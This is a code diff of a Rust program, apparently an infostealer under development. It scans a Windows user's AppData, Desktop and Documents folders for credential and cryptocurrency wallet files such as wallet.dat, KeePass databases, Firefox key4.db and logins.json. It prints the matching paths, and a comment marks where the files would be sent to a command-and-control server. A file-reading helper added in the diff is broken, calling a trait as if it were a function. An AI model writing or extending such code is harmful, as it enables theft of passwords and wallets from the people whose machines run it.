@@ -1,21 +1,11 @@
-use regex::Regex;
-use std::borrow::Borrow;
-use std::fs;
-use std::fs::{File, read, read_to_string};
-use std::io::Read;
-use std::ops::Deref;
-use std::path::{Path, PathBuf};
-use regex::Error;
-use dirs;
+use std::path::PathBuf;
 use walkdir::WalkDir;
-use whoami;
+use tokio;
 
+const MASKS: [&str; 13] = ["wallet.dat", ".wallet", ".mmd", ".kdbx", "UTC--20", "pass.txt", "key4.db", "login.bak", "key.bak", "logins.json", "password.txt", "cert8.db", "key3.db"];
 
-const MASKS: [&str; 12] = ["wallet.dat", ".wallet", ".mmd", ".kdbx", "UTC--20", "pass.txt", "key4.db", "login.bak", "key.bak", ".ldb", "logins.json", "password.txt"];
-
-fn main() {
-    //dirs::home_dir -> C:/Users/Alice
-    //dirs::data_local_dir();
+#[tokio::main]
+async fn main() {
     let home = get_home_dir().to_str().unwrap().to_owned();
     let appdata = home.clone() + "\\AppData";
     let desktop = home.clone() + "\\Desktop";
@@ -23,10 +13,7 @@ fn main() {
     walk_files(appdata);
     walk_files(desktop);
     walk_files(documents);
-    //test
-   // println!("{}", fetch_ip());
 }
-
 
 fn walk_files(path: String) {
     for entry in WalkDir::new(path)
@@ -36,7 +23,7 @@ fn walk_files(path: String) {
         let f_name = entry.file_name().to_string_lossy();
         if is_important_file(f_name.as_ref()) {
             println!("{}", entry.path().to_str().unwrap().clone().to_owned() );
-            //
+            //send files to C2 or something
         }
     }
 }
@@ -58,4 +45,9 @@ fn fetch_ip() -> String {
     } else {
         return "0.0.0.0".to_string();
     }
+}
+
+fn read_file_vec(filepath: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+    let data = tokio::io::AsyncRead(filepath)?;
+    Ok(data)
 }
